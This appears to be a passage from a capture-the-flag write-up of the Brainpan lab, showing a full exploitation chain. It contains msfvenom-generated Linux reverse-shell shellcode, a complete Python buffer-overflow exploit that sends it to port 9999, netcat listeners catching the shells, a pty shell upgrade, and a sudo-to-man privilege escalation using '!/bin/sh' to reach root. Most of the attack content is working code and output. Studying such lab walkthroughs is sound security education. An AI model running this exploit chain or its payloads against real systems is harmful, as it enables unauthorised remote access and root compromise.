└─$ sudo nc -nlvp 443   
[sudo] password for sec: 
listening on [any] 443 ...
connect to [10.0.0.12] from (UNKNOWN) [10.0.0.11] 49682

Microsoft Windows [Version 10.0.19045.5247]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Windows Kits\10\Debuggers>whoami
whoami
desktop-8pbgp5f\win
```
{% endraw %}

<br />
Double-check the nmap notice that operating system is likely to be linux.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/brainpan]
└─$ nmap -sV -sC -A -O -oN nmap 10.10.157.16
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 13:33 AEDT

<snip>

Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Android 4.1.1 (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Linux 2.6.32 (93%), Linux 3.0 - 3.2 (93%), Linux 3.0 - 3.5 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

<snip>

```
{% endraw %}

<br />
Generate a new msfvenom payload for Linux.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/brainpan]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.4.118.138 LPORT=443 ExitFunc=thread -b "\x00" -f python -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of python file: 530 bytes
payload =  b""
payload += b"\xdb\xde\xbb\xd7\x23\x22\xf1\xd9\x74\x24\xf4"
payload += b"\x5a\x33\xc9\xb1\x12\x31\x5a\x17\x03\x5a\x17"
payload += b"\x83\x15\x27\xc0\x04\xa8\xf3\xf3\x04\x99\x40"
payload += b"\xaf\xa0\x1f\xce\xae\x85\x79\x1d\xb0\x75\xdc"
payload += b"\x2d\x8e\xb4\x5e\x04\x88\xbf\x36\x9d\x6e\x36"
payload += b"\x4c\xc9\x6c\xb6\x51\xb1\xf8\x57\xe1\xa3\xaa"
payload += b"\xc6\x52\x9f\x48\x60\xb5\x12\xce\x20\x5d\xc3"
payload += b"\xe0\xb7\xf5\x73\xd0\x18\x67\xed\xa7\x84\x35"
payload += b"\xbe\x3e\xab\x09\x4b\x8c\xac"
```
{% endraw %}

<br />
Update the code with the new payload and update the IP address to point to the THM IP.

{% raw %}
```python
import socket
from struct import pack

ip = '10.10.47.78'
port = 9999

#baddies = \x00

payload =  b""
payload += b"\xdb\xde\xbb\xd7\x23\x22\xf1\xd9\x74\x24\xf4"
payload += b"\x5a\x33\xc9\xb1\x12\x31\x5a\x17\x03\x5a\x17"
payload += b"\x83\x15\x27\xc0\x04\xa8\xf3\xf3\x04\x99\x40"
payload += b"\xaf\xa0\x1f\xce\xae\x85\x79\x1d\xb0\x75\xdc"
payload += b"\x2d\x8e\xb4\x5e\x04\x88\xbf\x36\x9d\x6e\x36"
payload += b"\x4c\xc9\x6c\xb6\x51\xb1\xf8\x57\xe1\xa3\xaa"
payload += b"\xc6\x52\x9f\x48\x60\xb5\x12\xce\x20\x5d\xc3"
payload += b"\xe0\xb7\xf5\x73\xd0\x18\x67\xed\xa7\x84\x35"
payload += b"\xbe\x3e\xab\x09\x4b\x8c\xac"

inputBuffer  = b'A' * 524
inputBuffer += pack('<L',(0x311712f3))
inputBuffer += b'\x90' * 16
inputBuffer += payload
inputBuffer += b'C' * (1100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip,port))
s.recv(1024)

print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
s.sendall(inputBuffer + b'\r\n')

s.close()
```
{% endraw %}
<div class="caption">
    brain_0x0a.py
</div>

<br />
Kill the other listener if it is still running with ctrl + c.  Start a new listener on port 443.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/brainpan]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
```
{% endraw %}

<br />
Run the code, check the listener, and catch the shell.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/brainpan]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.4.118.138] from (UNKNOWN) [10.10.249.157] 54657
whoami
puck
```
{% endraw %}

<br />
Upgrade the shell by spawning another shell with python.

{% raw %}
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
puck@brainpan:/home/puck$
```
{% endraw %}

<br />
Run sudo -l to see a list of all of the command the user is permitted to use as root.

{% raw %}
```bash
puck@brainpan:/home/puck$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```
{% endraw %}

<br />
Run the anansi_util program that was discovered.

{% raw %}
```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util    
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```
{% endraw %}

<br />
Run the anansi_util with the manual option to see what it does.

{% raw %}
```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual ls
sudo /home/anansi/bin/anansi_util manual ls
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)
LS(1)                            User Commands                           LS(1)

NAME
       ls - list directory contents

SYNOPSIS
       ls [OPTION]... [FILE]...

DESCRIPTION
       List  information  about  the FILEs (the current directory by default).
       Sort entries alphabetically if none of -cftuvSUX nor --sort  is  speci‐
       fied.

       Mandatory  arguments  to  long  options are mandatory for short options
       too.

       -a, --all
              do not ignore entries starting with .

       -A, --almost-all
              do not list implied . and ..

       --author
 Manual page ls(1) line 1 (press h for help or q to quit)q
```
{% endraw %}

<br />
Now, that it is known that it calls the man command, lookup man on the gtfobins.

<a href="https://gtfobins.github.io/gtfobins/man/#sudo">GTFObins</a>
<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/gtfobins.png" title="The Results From GTFObins" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use the command again with sudo to drop into the manual.  Then, use !/bin/sh to drop into a root shell.

{% raw %}
```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual man
sudo /home/anansi/bin/anansi_util manual man
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)
MAN(1)                        Manual pager utils                        MAN(1)

NAME
       man - an interface to the on-line reference manuals

SYNOPSIS
       man  [-C  file]  [-d]  [-D]  [--warnings[=warnings]]  [-R encoding] [-L
       locale] [-m system[,...]] [-M path] [-S list]  [-e  extension]  [-i|-I]
       [--regex|--wildcard]   [--names-only]  [-a]  [-u]  [--no-subpages]  [-P
       pager] [-r prompt] [-7] [-E encoding] [--no-hyphenation] [--no-justifi‐
       cation]  [-p  string]  [-t]  [-T[device]]  [-H[browser]] [-X[dpi]] [-Z]
       [[section] page ...] ...
       man -k [apropos options] regexp ...
       man -K [-w|-W] [-S list] [-i|-I] [--regex] [section] term ...
       man -f [whatis options] page ...
       man -l [-C file] [-d] [-D] [--warnings[=warnings]]  [-R  encoding]  [-L
       locale]  [-P  pager]  [-r  prompt]  [-7] [-E encoding] [-p string] [-t]
       [-T[device]] [-H[browser]] [-X[dpi]] [-Z] file ...
       man -w|-W [-C file] [-d] [-D] page ...
       man -c [-C file] [-d] [-D] page ...
       man [-hV]

DESCRIPTION
 Manual page man(1) line 1 (press h for help or q to quit)!/bin/sh
!/bin/sh
# whoami
whoami
root
```
{% endraw %}

<br />
Now with root access, nick the root trophy.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/brainpan1/flagtrophy.png" title="The Results From GTFObins" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

Thank you so much for reading.